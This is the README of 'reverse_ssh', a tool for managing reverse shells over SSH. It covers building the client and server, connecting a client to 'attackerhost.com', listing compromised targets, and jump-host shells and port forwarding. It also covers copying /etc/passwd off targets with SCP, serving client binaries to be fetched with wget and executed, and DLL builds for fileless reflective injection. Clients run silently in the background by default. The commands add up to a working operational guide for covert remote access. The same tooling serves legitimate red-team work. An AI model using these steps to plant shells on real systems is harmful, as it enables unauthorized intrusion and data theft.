# Reverse SSH

Want to use SSH for reverse shells? Now you can.  

- Manage and connect to reverse shells with native SSH syntax
- Dynamic, local and remote forwarding with simple jumphost syntax
- Native SCP implementation for retrieving files from your targets
- Full windows shell even if the host is not supported by ConPty
- Mutual client & server authentication to create high trust control channels  
And more! 


```text
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+   RSSH  |
                    |    Reverse     |       |         |  Client |
                    |  SSH server    |       |         |         |
                    |                |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |   SSH   |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         |   RSSH  |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         |   RSSH  |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```

## TL;DR

```sh
git clone https://github.com/NHAS/reverse_ssh

cd reverse_ssh

make
cd bin/

# start the server
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232

# copy client to your target then connect to the server
./client attackerhost.com:3232

# Get help text
ssh localhost -p 3232 help

# See clients
ssh localhost -p 3232 ls -t

                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+


# Connect to full shell
ssh -J localhost:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac

# Or using hostname 

ssh -J localhost:3232 root.wombo

```

## Setup Instructions

> **NOTE:** reverse_ssh requires Go **1.17** or higher. Please check you have at least this version via `go version`

The simplest build command is just:

```sh
make
```

Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corresponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.

Golang allows your to effortlessly cross compile, the following is an example for building windows:

```sh
GOOS=windows GOARCH=amd64 make client # will create client.exe
```

You will need to create an `authorized_keys` file much like the ssh http://man.he.net/man5/authorized_keys, this contains *your* public key.
This will allow you to connect to the RSSH server.

Alternatively, you can use the --authorizedkeys flag to point to a file.

```sh
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control, then connect to the server.

```sh
./client yourserver.com:3232
```

You can then see what reverse shells have connected to you using `ls`:

```sh
ssh yourserver.com -p 3232 ls
                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root.wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+

```

Then typical ssh commands work, just specify your rssh server as a jump host. 

```sh
# Connect to full shell
ssh -J youserver.com:3232 root.wombo

# Run a command without pty
ssh -J youserver.com:3232 root.wombo ls

# Start remote forward 
ssh -R 1234:localhost:1234 -J youserver.com:3232 root.wombo ls

# Start dynamic forward 
ssh -D 9050 -J youserver.com:3232 root.wombo ls

# SCP 
scp -J youserver.com:3232 root.wombo:/etc/passwd .

```

## Fancy Features

### Default Server

Specify a default server at build time:

```sh
$ RSSH_HOMESERVER=localhost:1234 make

# Will connect to localhost:1234, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to example.com:1234
$ bin/client example.com:1234
```

### Built in Web Server

The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be placed in the project `bin/` folder, as it needs to find the client source.

```sh
./server --webserver :1234

# Generate an unnamed link
ssh 192.168.122.1 -p 1234

catcher$ link -h

link [OPTIONS]
Link will compile a client and serve the resulting binary on a link which is returned.
This requires the web server component has been enabled.
	-t	Set number of minutes link exists for (default is one time use)
	-s	Set homeserver address, defaults to server --homeserver_address if set, or server listen address if not.
	-l	List currently active download links
	-r	Remove download link
	--goos	Set the target build operating system (default to runtime GOOS)
	--goarch	Set the target build architecture (default to runtime GOARCH)
	--name	Set link name
	--shared-object	Generate shared object file

# Build a client binary
catcher$ link --name test
http://192.168.122.1:1234/test

```

Then you can download it as follows:

```sh
wget http://192.168.122.1:1234/test
chmod +x test
./test
```
### Windows DLL Generation 

You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`. 

```bash
CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
```

When the RSSH server has the webserver enabled you can also compile it with the link command: 

```
./server --webserver :1234

# Generate an unnamed link
ssh 192.168.122.1 -p 1234

catcher$ link --name windows_dll --shared-object --goos windows
http://192.168.122.1:1234/windows_dll
```

Which is useful when you want to do fileless injection of the rssh client. 

### Full Windows Shell Support

Most reverse shells for windows struggle to generate a shell environment that supports resizing, copying and pasting and all the other features that we're all very fond of. 
This project uses conpty on newer versions of windows, and the winpty library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell. 

## Foreground vs Background (Important note about clients)

By default, clients will run in the background. When started they will execute a new background instance (thus forking a new child process) and then the parent process will exit. If the fork is successful the message "Ending parent" will be printed.

This has one important ramification: once in the background a client will not show any output, including connection failure messages. If you need to debug your client, use the `--foreground` flag.
